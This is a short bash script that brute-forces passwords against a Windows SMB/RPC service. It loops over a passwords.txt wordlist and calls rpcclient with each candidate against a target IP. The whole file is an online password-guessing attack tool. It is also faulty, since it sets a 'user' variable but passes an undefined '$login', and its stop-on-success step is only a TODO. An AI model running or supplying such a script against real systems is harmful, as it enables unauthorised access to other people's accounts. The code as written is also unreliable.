#!/bin/bash
#password_list=$1
user=$1
ip=$2
for password in $(cat passwords.txt); do
  echo -n "[*] $login%$password"
  rpcclient -U "$login%$password" -c "getusername;quit" $ip
#TODO if success -stop 
done

